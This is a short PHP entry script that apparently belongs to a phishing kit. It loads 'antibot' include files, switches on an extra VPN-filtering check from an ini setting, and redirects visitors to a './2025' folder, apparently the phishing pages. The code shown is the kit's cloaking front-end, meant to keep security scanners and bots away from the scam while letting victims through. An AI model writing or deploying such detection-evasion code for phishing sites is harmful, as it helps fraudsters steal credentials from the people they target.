<?php

    require_once 'antibot1.php';
    require_once 'antibot2.php';

    $tanitatikaram = parse_ini_file("php.ini", true);
    $setting_vpn = $tanitatikaram['setting_vpn'];
    if ($setting_vpn == 'on') 
        {
          require_once 'antibot3.php';
        }

        header('Location: ./2025');